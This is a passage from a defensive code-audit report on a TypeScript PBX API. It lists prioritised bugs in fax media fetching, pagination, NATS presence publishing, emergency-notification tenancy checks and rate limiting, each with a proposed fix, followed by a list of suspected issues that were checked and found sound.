- Where: `apps/api/src/pbx/fax/fax-media.ts:58`
- Code: `const bytes = Buffer.from(await response.arrayBuffer());`
- Problem: the module header calls this "_the one place in this API that fetches a remote URL into the
  object store_" — and it buffers the whole response with no `Content-Length` check and no cap. The
  30 s `AbortSignal.timeout` bounds time, not bytes. A carrier-side bug or a redirected `media_url`
  returning a multi-GB body OOMs the API process, taking down every tenant's control plane, not just
  fax. The signature check upstream authenticates the _webhook_, not the arbitrary URL inside it.
- Fix: reject early on a declared length over a cap and enforce it while reading —
  `MAX_FAX_BYTES = 50 * 1024 * 1024`, check `content-length`, then stream and throw once accumulated
  exceeds it. The existing failure path already handles this correctly: the row stays filed without an
  `object_key`, which `fax-inbound.service.ts:102` documents as recoverable.
- Cross-area: none.

### [P1] Every fax list endpoint runs a second `count(*)`, contradicting the pagination contract it inherits (confidence: high)

- Where: `apps/api/src/pbx/fax/fax.repository.ts:101` and `:245`
- Code: `const totals = await transaction.select({ value: count() }).from(faxServer).where(where);`
- Problem: `shared/pagination.ts:13` states the area contract explicitly — "_`total` comes from a
  `count(*) over ()` window on the same query rather than a second `select count(*)`, so the count and
  the page can never disagree about the snapshot they were taken from_". Both fax list functions do
  exactly the thing that comment rules out. The page and the count can therefore disagree — the inbox
  is the highest-churn table in the slice, since the webhook consumer inserts into it continuously —
  and it doubles the query count on both list endpoints, with the two `await`s sequential.
- Fix: fold the count into the row query —
  `.select({ ...MESSAGE_COLUMNS, total: sql<number>\`count(*) over ()\` })`— and take`rows[0]?.total ?? 0`.
- Cross-area: none.

### [P2] `findMessageOrgById` does not constrain direction, so a `client_state` naming an inbound fax rewrites a received row (confidence: high)

- Where: `apps/api/src/pbx/fax/fax.repository.ts:564`
- Code: `select ... from ${faxMessage} where ${faxMessage.id} = ${id} limit 1`
- Problem: the doc comment calls it "_The organization owning an outbound fax row_" and the caller
  feeds the result straight into `applyOutboundStatus`, but the query matches any row in any
  direction. The sibling fallback `findOutboundOrgByTelnyxId` correctly adds
  `and direction = 'outbound'` (:585). A `fax.failed` whose `client_state` happens to name an inbound
  message id would flip a successfully received fax to `failed` and stamp an `errorReason` on it,
  destroying the ledger entry for a document sitting in the object store. Reachable only via
  carrier-signed input, hence P2, but the guard is free and the asymmetry is clearly unintentional.
- Fix: add `and ${faxMessage.direction} = 'outbound'` to the predicate.
- Cross-area: none.

### [P2] Signed fax links cannot survive a secret rotation, though the token layer supports it (confidence: high)

- Where: `apps/api/src/pbx/fax/fax.service.ts:262`
- Code: `const verified = verifyFaxMediaToken(token, { current: secret });`
- Problem: `verifyFaxMediaToken` takes `{ current, previous }` precisely so a rotation does not
  invalidate outstanding links — its own header advertises this (`fax-media-token.ts:14`) and
  `verifyRecordingToken` implements it. But `fax-env.ts` declares no previous-secret variable and this
  call site never passes one, so the capability is unreachable. Rotating `FAX_MEDIA_URL_SECRET`
  instantly breaks every link already sitting in a customer's inbox — for a TTL of up to 24 h, and
  fax-to-email links are the primary way users reach these documents.
- Fix: add `FAX_MEDIA_URL_SECRET_PREVIOUS: z.string().min(1).optional()` to `faxEnvSchema` and thread
  it through. Mirror whatever name the recording/voicemail equivalents already use.
- Cross-area: none.

### [P2] Repeated `?token=` on the public media route yields a 500 instead of a 403 (confidence: medium)

- Where: `apps/api/src/pbx/fax/fax.controller.ts:61`
- Code: `@Query("token") token: string,` … `await this.faxes.openSignedFax(token ?? "", …)`
- Problem: `token` is typed `string` but never validated. Fastify parses a repeated query key into an
  array, so `?token=a&token=b` hands an array to `verifyFaxMediaToken`, which does string work on it —
  a `TypeError` surfacing as an unhandled 500 on an unauthenticated public route rather than the
  `FaxLinkInvalidException` (403) the slice defines for exactly this. Every other input in the slice
  goes through `parseDto`; this is the sole unvalidated boundary.
- Fix: `const raw = typeof token === "string" ? token : "";` before the call.
- Cross-area: if the CDR export media route takes the same shortcut, the same fix applies there.

## `calls` / `extensions` / `emergency-addresses` / `call-flows`

### [P0] The call-flow presence publisher connects to the wrong broker with the wrong identity (confidence: high)

- Where: `apps/api/src/pbx/call-flows/call-flow-presence.publisher.ts:59`
- Code:
  ```ts
  const url = this.env.NATS_URL; // :53 — read, checked at :54 …
  this.connection = await connect(natsConnectionOptions(this.env as never)); // …and never used
  ```
- Problem: `natsConnectionOptions(source, service?)`
  (`packages/config/src/nats-credentials.ts:226-234`) returns **only** credentials/TLS — never
  `servers`. All ~20 other call sites spread it into an object that supplies `servers` and the `"api"`
  service tag (`calls.service.ts:91-97`, `emergency-consumer.service.ts:104-110`,
  `pbx-bootstrap.ts:42`, …). This is the lone exception, and the `as never` cast is what silences the
  type error.
- Failure scenario: the client dials the nats.js default `localhost:4222` instead of `NATS_URL`, so in
  any deployment where the broker is not co-located the connection fails at boot — swallowed by the
  `catch` at :63 as a `warn` — and every busy lamp is silently dead forever. Even co-located, the
  missing `"api"` tag drops it to `NATS_USER`/`NATS_PASS`; a deployment with split credentials
  (`NATS_API_USER`/`PASS` only) fails authorization. No test covers `onModuleInit` here.
- Fix:
  ```ts
  this.connection = await connect({
  	servers: url,
  	...natsConnectionOptions(this.env, "api"),
  	name: "optimiq-api-call-flow-presence",
  });
  ```
  and drop the `as never`.
- Cross-area: none — the KV write path itself is correct.

### [P0] A night-mode lamp goes dark after 5 minutes: the presence key is written once but the bucket has a TTL (confidence: high)

- Where: `apps/api/src/pbx/call-flows/call-flow-presence.publisher.ts:99-113` vs `packages/events/src/streams.ts:570-576`
- Code:
  ```ts
  await bucket.put(kvKey, new TextEncoder().encode(JSON.stringify({ … state: "active" … })));
  export const PRESENCE_KV = { name: "presence", ttlMs: 5 * MINUTE_MS, storage: "memory", … };
  ```
- Problem: the class header reasons that "night is `active` and day is a DELETE … it costs nothing to
  store for the state a flow spends most of its life in" — but the `presence` bucket expires values
  after **5 minutes** and is `storage: "memory"`. The engine's co-writer
  (`apps/engine/src/presence`) re-publishes continuously off device-state events, so the TTL is
  invisible there; a call flow is written exactly once per toggle and never refreshed.
- Failure scenario: a receptionist flips the flow to night at 17:00; every BLF lamp lights, then goes
  dark at 17:05 while calls still route to the night destination for the next 15 hours. The lamp now
  means the opposite of the truth. A broker restart loses it immediately. The comment's own claim that
  "a stale lamp is self-correcting on the next toggle" is what makes this dangerous: the stale state
  is _dark_, so nobody toggles.
- Fix: add a keep-alive — an interval (say 60 s, cleared in `onApplicationShutdown` alongside the
  drain) that re-puts every currently-lit key held in a `Map<kvKey, {orgId, key}>`, with `delete`
  removing the entry. Raising `PRESENCE_KV.ttlMs` is the alternative but changes a bucket the engine
  also depends on, so the refresh loop is the contained change.
- Cross-area: the identical write-once path is in `TimeConditionOverrideService.setOverride`
  (`call-flows.service.ts:99-106`) for `overrideFeatureCode`; both need the same keep-alive. Only
  observable once the P0 above is fixed.

### [P1] The emergency consumer's tenancy cross-check does not actually check the tenant (confidence: high)

- Where: `apps/api/src/pbx/emergency-addresses/emergency-consumer.service.ts:226-240`, used at `:248`
- Code:
  ```ts
  if (envelope.subject !== message.subject) {
      // "…could scope this notification — and the settings read behind it — to the wrong tenant."
      message.term(); return;
  }
  const outcome = await this.notifications.notify(envelope.orgId, { … });
  ```
- Problem: the guard compares two _subject strings to each other_, then scopes the work by
  `envelope.orgId`, which it never relates to either. The subject is
  `calls.evt.v1.<orgId>.<callId>.call.emergency.dialed`, so the org token is at index 3 and is simply
  not read. A message with `subject === message.subject` but an `orgId` naming a different tenant
  passes the check the comment says exists to stop exactly this.
- Failure scenario: a buggy or compromised publisher (or a future replay/bridge tool) emits an event
  on org B's subject carrying `orgId: A`. `notify` then reads **org A's**
  `emergencyNotificationEmails` and resolves the dispatchable address inside `withTenantScope(A)` —
  org B's 911 event is mailed to org A's front desk, and org B is never told. For a Kari's Law path
  both halves are compliance failures.
- Fix:
  ```ts
  const subjectOrgId = message.subject.split(".")[3];
  if (envelope.subject !== message.subject || envelope.orgId !== subjectOrgId) { … term() … }
  ```
- Cross-area: `voicemail-boxes/voicemail-consumer.service.ts:245-260` has the identical vacuous check
  and then reads `mailboxId` off the subject while passing `envelope.orgId` to `file()` — same fix,
  and that file is the precedent this one cites. (p–z auditor's subdir.)

### [P2] A 503 for an absent broker still spends the tenant's origination budget (confidence: high)

- Where: `apps/api/src/pbx/calls/calls.service.ts:130-139`
- Code:
  ```ts
  const verdict = this.limiter.consume(organizationId);
  if (!verdict.allowed) { … throw originateRateLimitedException(…) }
  const connection = this.connection;
  if (connection === undefined || connection.isClosed()) { throw originateUnavailableException(…) }
  ```
- Problem: the counter is incremented before the availability check, so 60 requests during a broker
  outage — none of which placed a call — exhaust the window. The class header carefully argues the
  ordering of authz vs. rate limit but not this one; the limiter's own header says the thing being
  bounded "is money", and a request that reached no engine spent none.
- Fix: move the connection guard above `limiter.consume(...)`. Authorization still precedes both.
- Cross-area: none.

---

## Verified and deliberately NOT reported

Recorded so the next reader does not re-derive them:

- **Feature-code `params.lotId` / `params.groupId` are not existence-checked on write.** They are not
  destination trios, so `assertDestinations` never sees them. But `packages/routing/src/compile.ts`
  `featureCodeTarget` (:2972) → `parkNodeById` (:2498) → `missingTarget` (:885) raises a
  **`bag.error`**, and compile-on-write runs inside the write transaction and turns errors into a 422
  plus rollback. A dangling pinned lot cannot be saved. Not a finding.
- **Class-level `@RequirePermissions` on `ExtensionUsersController`.** The guard uses
  `reflector.getAllAndOverride(…, [context.getHandler(), context.getClass()])`
  (`apps/api/src/auth/require-permissions.guard.ts:60-62`), so the class-level grant does apply to all
  three routes. Not a finding.
- **Every moderation route on `ConferenceModerationController` declares only `conferences.read`.**
  Looks like an authorization gap; it is not. `ConferenceModerationService.assertMayModerate`
  (`conference-moderation.service.ts:209-215`) enforces `conferences.moderate` before anything
  happens, and both the controller header and the service header argue the split (a better 403).
  Not a finding.
- **No `organization_id` predicate anywhere in `pbx.repository.ts` / `audit-log.repository.ts`.**
  Deliberate and documented: every query runs inside `withTenantScope`, which drops into
  `pbx_tenant_tls` (created `inherit: false`) and publishes the org id for the RLS policies. Adding a
  redundant predicate would hide a policy that failed to apply. Tenant isolation in this area is
  sound as far as I could verify.
- **The audit-log cursor is unsigned and trivially reversible.** A tampered cursor can only move the
  caller within their own tenant's rows — the org predicate comes from the session and the RLS policy,
  never from the cursor — and `decodeAuditLogCursor` validates both halves. Not a finding.
- **`AuditLogCursorError` is thrown inside the `withTenantScope` callback** but the `.catch(rethrowCursorError)`
  is attached to the outer promise (`audit-log-query.service.ts:87-92`), so it is caught and becomes a 400. Costs one pointless transaction open on a malformed cursor; not worth a finding.
- **`update()` falls back to `existing` when `returning()` is empty** (`pbx.repository.ts:736`).
  Unreachable: `requireRow` succeeded in the same transaction and the `where` is the same primary key.
- **The `.own` floor on `/extensions`.** All three lowered routes DO narrow rows:
  `GET /extensions` → `extensions.service.ts:65-68` (`holdsUnscoped` else `listRestricted`);
  `GET /extensions/:id` → `:76-78` (`assertOwnsRow`); `PATCH /extensions/:id` → `:103-106`
  (`assertOwnsRow` **and** a `SELF_EDITABLE_EXTENSION_FIELDS` allowlist that correctly excludes
  `tollClass`). No read/write asymmetry. Not a finding.
- **`POST /api/v1/calls` lets any `calls.originate` holder dial `from` any extension in the tenant.**
  Explicitly designed and argued at `packages/auth/src/permissions.ts:1750-1761`. Not a finding.
- **Telnyx webhook signature verification** (`carrier/carrier-webhook.controller.ts`): raw bytes,
  `crypto.verify` Ed25519, two-sided timestamp window, 503 when unconfigured, length checks. Sound.
- **Media-token domain separation, expiry and tenant binding** (`media/media-token.ts:46-74`): binds
  `{r,o,e}` under a per-family derived key and delegates the compare to `verifyRecordingToken`. Sound.
- **Object-key traversal in the media store**: every segment is a server-minted UUID and
  `resolveObjectPath` re-proves containment. The upload size cap is enforced by `@fastify/multipart`
  `limits.fileSize` (`pbx-bootstrap.ts:109`) _and_ re-checked while buffering. Not findings.
- **The org-limit create race** is accurately documented at `org-limits.service.ts:29-37` as an
  accepted one-per-concurrent-request overshoot. The retention cache is bounded at
  `recording-retention-policy.service.ts:68-97`. Not findings.
